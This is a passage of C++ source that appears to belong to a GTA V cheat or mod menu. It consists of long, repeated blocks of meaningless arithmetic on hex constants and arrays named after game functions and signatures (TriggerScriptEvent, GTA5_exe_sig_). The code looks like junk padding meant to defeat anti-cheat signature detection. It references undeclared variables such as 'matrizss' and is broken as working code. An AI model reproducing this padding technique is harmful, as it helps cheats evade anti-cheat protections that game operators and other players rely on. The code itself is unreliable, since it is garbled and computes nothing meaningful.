						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<Z>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
